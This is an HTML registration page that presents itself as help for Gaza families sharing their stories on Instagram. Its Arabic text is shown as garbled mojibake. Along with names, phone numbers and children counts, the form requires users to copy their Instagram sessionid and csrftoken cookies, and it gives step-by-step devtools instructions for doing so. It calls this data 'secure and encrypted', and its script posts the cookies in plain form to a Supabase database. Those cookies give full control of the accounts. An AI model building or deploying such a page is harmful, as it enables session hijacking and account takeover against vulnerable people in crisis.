<!DOCTYPE html>
<html lang="en" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gaza Family Registration - Ù…Ø³Ø§Ø¹Ø¯Ø© Ø¹Ø§Ø¦Ù„Ø§Øª ØºØ²Ø©</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            direction: rtl;
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
        }

        .header {
            background: linear-gradient(135deg, #2ecc71 0%, #27ae60 100%);
            padding: 30px;
            text-align: center;
            color: white;
        }

        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }

        .header p {
            font-size: 16px;
            opacity: 0.9;
        }

        .flag {
            font-size: 48px;
            margin-bottom: 10px;
        }

        .content {
            padding: 30px;
        }

        .step {
            margin-bottom: 30px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 10px;
            border-right: 4px solid #2ecc71;
        }

        .step-number {
            display: inline-block;
            width: 30px;
            height: 30px;
            background: #2ecc71;
            color: white;
            border-radius: 50%;
            text-align: center;
            line-height: 30px;
            font-weight: bold;
            margin-left: 10px;
        }

        .step h3 {
            display: inline-block;
            color: #2c3e50;
            margin-bottom: 10px;
        }

        .step p {
            color: #555;
            line-height: 1.6;
            margin-top: 10px;
        }

        .warning {
            background: #fff3cd;
            border-right: 4px solid #ffc107;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
        }

        .warning strong {
            color: #856404;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #2c3e50;
            font-weight: bold;
        }

        .form-group input,
        .form-group textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }

        .form-group input:focus,
        .form-group textarea:focus {
            outline: none;
            border-color: #2ecc71;
        }

        .form-group textarea {
            min-height: 100px;
            font-family: monospace;
            resize: vertical;
        }

        .submit-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #2ecc71 0%, #27ae60 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(46, 204, 113, 0.4);
        }

        .submit-btn:disabled {
            background: #95a5a6;
            cursor: not-allowed;
            transform: none;
        }

        .success {
            background: #d4edda;
            border-right: 4px solid #28a745;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            display: none;
        }

        .error {
            background: #f8d7da;
            border-right: 4px solid #dc3545;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            display: none;
        }

        .help-text {
            font-size: 14px;
            color: #6c757d;
            margin-top: 5px;
        }

        @media (max-width: 768px) {
            .container {
                margin: 10px;
            }

            .header h1 {
                font-size: 24px;
            }

            .content {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="flag">ğŸ‡µğŸ‡¸</div>
            <h1>ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¹Ø§Ø¦Ù„Ø© - Family Registration</h1>
            <p>Ù†Ø³Ø§Ø¹Ø¯ÙƒÙ… ÙÙŠ Ù…Ø´Ø§Ø±ÙƒØ© Ù‚ØµØµÙƒÙ… Ù…Ø¹ Ø§Ù„Ø¹Ø§Ù„Ù…</p>
            <p style="font-size: 14px; margin-top: 10px;">We help you share your stories with the world</p>
        </div>

        <div class="content">
            <div class="warning">
                <strong>âš ï¸ Ù…Ù‡Ù… Ø¬Ø¯Ø§Ù‹ - Very Important:</strong>
                <p>Ù‡Ø°Ù‡ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¢Ù…Ù†Ø© ÙˆÙ…Ø´ÙØ±Ø©. Ù†Ø³ØªØ®Ø¯Ù…Ù‡Ø§ ÙÙ‚Ø· Ù„Ù…Ø³Ø§Ø¹Ø¯ØªÙƒÙ….</p>
                <p style="margin-top: 5px;">This information is secure and encrypted. We only use it to help you.</p>
            </div>

            <form id="registrationForm">
                <div class="form-group">
                    <label>Ø§Ø³Ù… Ø§Ù„Ø¹Ø§Ø¦Ù„Ø© - Family Name</label>
                    <input type="text" id="familyName" required placeholder="Ù…Ø«Ø§Ù„: Ø¹Ø§Ø¦Ù„Ø© Ø£Ø­Ù…Ø¯">
                    <div class="help-text">Example: Ahmed Family</div>
                </div>

                <div class="form-group">
                    <label>Ø§Ø³Ù… Ø­Ø³Ø§Ø¨ Instagram - Instagram Username</label>
                    <input type="text" id="instagramHandle" required placeholder="@username">
                    <div class="help-text">Your Instagram account name (without @)</div>
                </div>

                <div class="form-group">
                    <label>Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ - Phone Number</label>
                    <input type="tel" id="phoneNumber" placeholder="+970...">
                    <div class="help-text">Optional - for us to contact you</div>
                </div>

                <div class="form-group">
                    <label>Ø¹Ø¯Ø¯ Ø§Ù„Ø£Ø·ÙØ§Ù„ - Number of Children</label>
                    <input type="number" id="childrenCount" min="0" value="0">
                </div>

                <div class="form-group">
                    <label>Instagram Session ID - Ù…Ø¹Ø±Ù Ø§Ù„Ø¬Ù„Ø³Ø©</label>
                    <textarea id="sessionId" required placeholder="Paste the sessionid cookie value here"></textarea>
                    <div class="help-text">
                        <strong>How to get this:</strong><br>
                        1. Open Instagram in your browser<br>
                        2. Press F12 (or right-click â†’ Inspect)<br>
                        3. Go to "Application" tab â†’ "Cookies" â†’ "instagram.com"<br>
                        4. Find "sessionid" and copy its value<br>
                        5. Paste it here
                    </div>
                </div>

                <div class="form-group">
                    <label>Instagram CSRF Token - Ø±Ù…Ø² Ø§Ù„Ø­Ù…Ø§ÙŠØ©</label>
                    <textarea id="csrfToken" required placeholder="Paste the csrftoken cookie value here"></textarea>
                    <div class="help-text">Same process as above, but find "csrftoken"</div>
                </div>

                <div class="success" id="successMessage">
                    <h3>âœ… Ù†Ø¬Ø­ Ø§Ù„ØªØ³Ø¬ÙŠÙ„ - Registration Successful!</h3>
                    <p>Ø´ÙƒØ±Ø§Ù‹ Ù„Ùƒ. Ø³Ù†Ø¨Ø¯Ø£ Ø§Ù„Ø¹Ù…Ù„ Ø¹Ù„Ù‰ Ù…Ø³Ø§Ø¹Ø¯ØªÙƒ Ù‚Ø±ÙŠØ¨Ø§Ù‹.</p>
                    <p>Thank you. We will start helping you soon.</p>
                </div>

                <div class="error" id="errorMessage">
                    <h3>âŒ Ø­Ø¯Ø« Ø®Ø·Ø£ - Error Occurred</h3>
                    <p id="errorText"></p>
                </div>

                <button type="submit" class="submit-btn" id="submitBtn">
                    ØªØ³Ø¬ÙŠÙ„ - Register Now
                </button>
            </form>
        </div>
    </div>

    <script>
        const SUPABASE_URL = 'YOUR_SUPABASE_URL_HERE';
        const SUPABASE_ANON_KEY = 'YOUR_SUPABASE_ANON_KEY_HERE';

        document.getElementById('registrationForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const submitBtn = document.getElementById('submitBtn');
            const successMessage = document.getElementById('successMessage');
            const errorMessage = document.getElementById('errorMessage');

            // Hide previous messages
            successMessage.style.display = 'none';
            errorMessage.style.display = 'none';

            // Disable button
            submitBtn.disabled = true;
            submitBtn.textContent = 'Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ³Ø¬ÙŠÙ„... Registering...';

            // Collect form data
            const data = {
                name: document.getElementById('familyName').value,
                instagram_handle: document.getElementById('instagramHandle').value.replace('@', ''),
                phone_number: document.getElementById('phoneNumber').value || null,
                children_count: parseInt(document.getElementById('childrenCount').value) || 0,
                session_cookies: JSON.stringify({
                    sessionid: document.getElementById('sessionId').value.trim(),
                    csrftoken: document.getElementById('csrfToken').value.trim()
                }),
                active: true,
                created_at: new Date().toISOString()
            };

            try {
                const response = await fetch(`${SUPABASE_URL}/rest/v1/families`, {
                    method: 'POST',
                    headers: {
                        'apikey': SUPABASE_ANON_KEY,
                        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
                        'Content-Type': 'application/json',
                        'Prefer': 'return=minimal'
                    },
                    body: JSON.stringify(data)
                });

                if (response.ok) {
                    successMessage.style.display = 'block';
                    document.getElementById('registrationForm').reset();

                    // Scroll to success message
                    successMessage.scrollIntoView({ behavior: 'smooth', block: 'center' });
                } else {
                    throw new Error('Failed to register. Please try again.');
                }

            } catch (error) {
                errorMessage.style.display = 'block';
                document.getElementById('errorText').textContent = error.message;
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = 'ØªØ³Ø¬ÙŠÙ„ - Register Now';
            }
        });
    </script>
</body>
</html>
